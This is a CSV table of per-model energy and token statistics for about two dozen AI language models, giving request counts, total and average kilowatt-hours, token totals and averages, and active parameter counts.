model_name,count,total_kwh,total_tokens,avg_kwh,avg_tokens,active_params_b
glm-4.5,5169,228.90857434409972,10692755,0.044284885731108475,2068.631263300445,32.0
claude-4-5-sonnet,16075,1953.747375737599,22332329,0.12153949460265001,1389.2584136858477,137.0
gpt-5-nano,8199,28.879255230209967,6894283,0.003522289941481884,840.8687644834736,11.0
command-a,17511,292.51921965308884,16052607,0.016704883767522632,916.7156073325339,111.0
qwen2.5-coder-32b-instruct,16937,98.4389721511003,13794815,0.005812066608673337,814.4780657731593,32.0
llama-3.1-nemotron-70b-instruct,16046,202.3473177145324,16228378,0.012610452306776293,1011.3659478997881,70.0
gemma-3n-e4b-it,8838,30.43605140828002,9491946,0.0034437713745508053,1073.9925322471147,4.0
gpt-5.1,6523,373.9083030505595,7870024,0.057321524306386554,1206.5037559405182,94.0
mixtral-8x22b-instruct-v0.1,11148,105.65977948811971,5989797,0.00947791348117328,537.2979009687837,44.0
phi-4,22216,77.49417568552042,16810454,0.0034882146059380813,756.6823010442924,14.0
qwen3-max-2025-09-23,6304,370.36282155264115,6487632,0.05875044758131998,1029.1294416243654,32.0
aya-expanse-32b,11905,62.16197256528003,8711112,0.0052215012654582135,731.7187736245276,32.0
ministral-8b-instruct-2410,20998,60.36066882465976,16019881,0.0028745913336822443,762.924135631965,8.0
llama-4-scout,14152,55.21358006256995,10974913,0.0039014683481182837,775.5026144714528,17.0
gpt-4.1-mini,19918,219.90930506374883,16697217,0.011040732255434725,838.2978712722161,75.0
mistral-small-2506,9734,47.64079458444669,7922641,0.00489426695956921,813.9142182042326,24.0
magistral-medium,5630,81.6653572212101,4102431,0.01450539204639611,728.6733570159857,123.0
gemma-3-27b,19283,152.3023233643437,23670539,0.007898269116026743,1227.5340455323342,27.0
grok-4-fast,5417,1768.526005892056,6931679,0.32647701788666345,1279.6158390252908,121.0
hermes-4-70b,6309,35.421177653333416,2840800,0.005614388596185357,450.2773815184657,70.0
deepseek-r1,9837,465.2634545149592,9893804,0.047297291299680716,1005.7745247534817,37.0
mistral-large-2411,20571,332.2091728294986,16688413,0.016149393458242116,811.2591998444412,123.0
mistral-medium-2508,13256,411.48687552557567,20670901,0.03104155669323896,1559.361873868437,123.0
magistral-small-2506,7353,28.991780405686647,4821319,0.003942850592368645,655.6941384468925,24.0
hermes-3-llama-3.1-405b,15269,2081.2330480036026,8747394,0.136304476259323,572.8858471412666,405.0
